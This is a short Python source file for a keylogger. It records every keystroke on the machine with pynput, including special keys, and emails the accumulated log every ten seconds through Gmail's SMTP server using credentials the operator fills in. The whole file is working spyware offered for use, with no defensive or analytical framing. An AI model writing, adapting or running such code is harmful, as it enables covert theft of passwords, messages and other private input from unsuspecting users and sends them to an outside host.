import pynput.keyboard
import threading
import smtplib
import os 
import shutil



class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        
        try:
            current_key = str(key.char) 

        except AttributeError:
            if key == key.enter:
                current_key = '\n'

            elif key == key.backspace:
                current_key = '[BACKSPACE]'

            elif key == key.ctrl_l:
                current_key = '[CONTROL_l]'

            elif key == key.ctrl_r:
                current_key = '[CONTROL_r]'

            elif key == key.shift:
                current_key = '[SHIFT]'

            elif key == key.shift_r:
                current_key = '[SHIFT_r]'

            elif key == key.tab:
                current_key = '[TAB]'
            
            elif key == key.alt_l:
                current_key = '[ALT_l]'
            
            elif key == key.alt_r:
                current_key = '[ALT_r]'

            elif key == key.caps_lock:
                current_key = '[CAPS-LOCK]'

            elif key == key.esc:
                current_key = '[ESC]'

            elif key == key.space:
                current_key = ' '
            else:
                current_key = ' [' + str(key) + '] '
        self.append_to_log(str(current_key))

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    #def replace_file(self, url):
        #shutil.move(r'C:\Users\Амир\Desktop\mov.txt', r'D:\Games')
        

    def report(self):
        self.send_mail(self.email, self.password, self.log.encode('utf-8'))
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)
        
        
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            if 'quit' == self.log:
                keyboard_listener.stop()
            


                       #Here enter your gmail and password
keylog = Keylogger(10, 'Your-gmail', 'Your-password')
keylog.start()

